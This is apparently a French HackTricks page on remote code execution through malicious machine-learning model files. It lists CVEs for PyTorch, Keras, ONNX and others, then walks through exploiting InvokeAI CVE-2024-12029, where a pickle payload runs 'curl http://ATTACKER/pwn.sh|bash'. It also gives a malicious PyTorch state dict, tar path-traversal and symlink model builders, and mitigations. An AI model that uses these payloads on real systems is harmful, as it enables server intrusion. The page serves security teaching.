# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Chargement des mod√®les pour RCE

Les mod√®les d'apprentissage automatique sont g√©n√©ralement partag√©s dans diff√©rents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ces mod√®les peuvent √™tre charg√©s sur les machines des d√©veloppeurs ou dans des syst√®mes de production pour les utiliser. En g√©n√©ral, les mod√®les ne devraient pas contenir de code malveillant, mais il existe des cas o√π le mod√®le peut √™tre utilis√© pour ex√©cuter du code arbitraire sur le syst√®me en tant que fonctionnalit√© pr√©vue ou en raison d'une vuln√©rabilit√© dans la biblioth√®que de chargement du mod√®le.

Au moment de la r√©daction, voici quelques exemples de ce type de vuln√©rabilit√©s :

| **Framework / Outil**      | **Vuln√©rabilit√© (CVE si disponible)**                                                                                       | **Vecteur RCE**                                                                                                                         | **R√©f√©rences**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *D√©s√©rialisation non s√©curis√©e dans* `torch.load` **(CVE-2025-32434)**                                                     | Pickle malveillant dans le point de contr√¥le du mod√®le conduit √† l'ex√©cution de code (contournant la protection `weights_only`)            | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + t√©l√©chargement de mod√®le malveillant provoque l'ex√©cution de code ; d√©s√©rialisation RCE Java dans l'API de gestion                | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non s√©curis√©) <br> **CVE-2024-3660** (Keras Lambda)                                               | Chargement de mod√®le √† partir de YAML utilise `yaml.unsafe_load` (ex√©cution de code) <br> Chargement de mod√®le avec la couche **Lambda** ex√©cute du code Python arbitraire | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (analyse TFLite)                                                                                         | Mod√®le `.tflite` malform√© d√©clenche un d√©passement d'entier ‚Üí corruption de la m√©moire (RCE potentiel)                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Chargement d'un mod√®le via `joblib.load` ex√©cute pickle avec le payload `__reduce__` de l'attaquant                                     | |
| **NumPy** (Python)          | **CVE-2019-6446** (non s√©curis√© `np.load`) *contest√©*                                                                        | `numpy.load` par d√©faut permettait des tableaux d'objets pickl√©s ‚Äì `.npy/.npz` malveillant d√©clenche l'ex√©cution de code                | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (travers√©e de r√©pertoire) <br> **CVE-2024-5187** (travers√©e tar)                                         | Le chemin des poids externes du mod√®le ONNX peut √©chapper au r√©pertoire (lecture de fichiers arbitraires) <br> Mod√®le ONNX malveillant tar peut √©craser des fichiers arbitraires (menant √† RCE) | |
| Runtime ONNX (risque de conception) | *(Pas de CVE)* op√©rations personnalis√©es ONNX / flux de contr√¥le                                                        | Mod√®le avec op√©rateur personnalis√© n√©cessite le chargement du code natif de l'attaquant ; des graphes de mod√®les complexes abusent de la logique pour ex√©cuter des calculs non pr√©vus | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (travers√©e de chemin)                                                                                     | Utiliser l'API de chargement de mod√®le avec `--model-control` activ√© permet une travers√©e de chemin relative pour √©crire des fichiers (par exemple, √©craser `.bashrc` pour RCE) | |
| **GGML (format GGUF)**      | **CVE-2024-25664 ‚Ä¶ 25668** (multiples d√©passements de tas)                                                                  | Fichier de mod√®le GGUF malform√© provoque des d√©passements de tampon dans le parseur, permettant l'ex√©cution de code arbitraire sur le syst√®me victime | |
| **Keras (anciens formats)** | *(Pas de nouveau CVE)* Mod√®le Keras H5 h√©rit√©                                                                                 | Mod√®le HDF5 (`.h5`) malveillant avec code de couche Lambda s'ex√©cute toujours au chargement (Keras safe_mode ne couvre pas l'ancien format ‚Äì "attaque de r√©trogradation") | |
| **Autres** (g√©n√©ral)        | *D√©faut de conception* ‚Äì S√©rialisation Pickle                                                                                 | De nombreux outils ML (par exemple, formats de mod√®le bas√©s sur pickle, `pickle.load` de Python) ex√©cuteront du code arbitraire int√©gr√© dans les fichiers de mod√®le √† moins d'√™tre att√©nu√©s | |

De plus, il existe des mod√®les bas√©s sur pickle Python comme ceux utilis√©s par [PyTorch](https://github.com/pytorch/pytorch/security) qui peuvent √™tre utilis√©s pour ex√©cuter du code arbitraire sur le syst√®me s'ils ne sont pas charg√©s avec `weights_only=True`. Ainsi, tout mod√®le bas√© sur pickle pourrait √™tre particuli√®rement susceptible √† ce type d'attaques, m√™me s'ils ne sont pas list√©s dans le tableau ci-dessus.

### üÜï  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open-source populaire pour Stable-Diffusion. Les versions **5.3.1 ‚Äì 5.4.2** exposent le point de terminaison REST `/api/v2/models/install` qui permet aux utilisateurs de t√©l√©charger et de charger des mod√®les √† partir d'URLs arbitraires.

En interne, le point de terminaison appelle finalement :
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Lorsque le fichier fourni est un **checkpoint PyTorch (`*.ckpt`)**, `torch.load` effectue une **d√©s√©rialisation pickle**. √âtant donn√© que le contenu provient directement de l'URL contr√¥l√©e par l'utilisateur, un attaquant peut int√©grer un objet malveillant avec une m√©thode `__reduce__` personnalis√©e √† l'int√©rieur du checkpoint ; la m√©thode est ex√©cut√©e **lors de la d√©s√©rialisation**, conduisant √† une **ex√©cution de code √† distance (RCE)** sur le serveur InvokeAI.

La vuln√©rabilit√© a √©t√© attribu√©e √† **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guide d'exploitation

1. Cr√©er un checkpoint malveillant :
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. H√©bergez `payload.ckpt` sur un serveur HTTP que vous contr√¥lez (par exemple, `http://ATTACKER/payload.ckpt`).
3. D√©clenchez le point de terminaison vuln√©rable (aucune authentification requise) :
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Lorsque InvokeAI t√©l√©charge le fichier, il appelle `torch.load()` ‚Üí le gadget `os.system` s'ex√©cute et l'attaquant obtient une ex√©cution de code dans le contexte du processus InvokeAI.

Exploitation pr√™te √† l'emploi : **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatise tout le flux.

#### Conditions

‚Ä¢  InvokeAI 5.3.1-5.4.2 (drapeau de scan par d√©faut **false**)
‚Ä¢  `/api/v2/models/install` accessible par l'attaquant
‚Ä¢  Le processus a les permissions pour ex√©cuter des commandes shell

#### Att√©nuations

* Mettez √† niveau vers **InvokeAI ‚â• 5.4.3** ‚Äì le correctif d√©finit `scan=True` par d√©faut et effectue une analyse de logiciels malveillants avant la d√©s√©rialisation.
* Lors du chargement de points de contr√¥le de mani√®re programmatique, utilisez `torch.load(file, weights_only=True)` ou le nouvel [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Appliquez des listes d'autorisation / signatures pour les sources de mod√®les et ex√©cutez le service avec le moindre privil√®ge.

> ‚ö†Ô∏è N'oubliez pas que **tout** format bas√© sur Python pickle (y compris de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrins√®quement dangereux √† d√©s√©rialiser √† partir de sources non fiables.

---

Exemple d'une att√©nuation ad hoc si vous devez maintenir des versions plus anciennes d'InvokeAI fonctionnant derri√®re un proxy inverse :
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Exemple ‚Äì cr√©ation d'un mod√®le PyTorch malveillant

- Cr√©er le mod√®le :
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Charger le mod√®le :
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Mod√®les pour le Travers√©e de Chemin

Comme comment√© dans [**cet article de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de mod√®les utilis√©s par diff√©rents frameworks d'IA sont bas√©s sur des archives, g√©n√©ralement `.zip`. Par cons√©quent, il pourrait √™tre possible d'abuser de ces formats pour effectuer des attaques de travers√©e de chemin, permettant de lire des fichiers arbitraires depuis le syst√®me o√π le mod√®le est charg√©.

Par exemple, avec le code suivant, vous pouvez cr√©er un mod√®le qui cr√©era un fichier dans le r√©pertoire `/tmp` lorsqu'il est charg√© :
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, avec le code suivant, vous pouvez cr√©er un mod√®le qui cr√©era un symlink vers le r√©pertoire `/tmp` lorsqu'il sera charg√© :
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Plong√©e approfondie : d√©s√©rialisation .keras et recherche de gadgets

Pour un guide cibl√© sur les internals de .keras, RCE de la couche Lambda, le probl√®me d'importation arbitraire dans ‚â§ 3.8, et la d√©couverte de gadgets post-correction √† l'int√©rieur de la liste blanche, voir :

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## R√©f√©rences

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì D√©s√©rialisation de donn√©es non fiables par InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [Commit de patch InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Documentation du module Metasploit de Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì consid√©rations de s√©curit√© pour torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
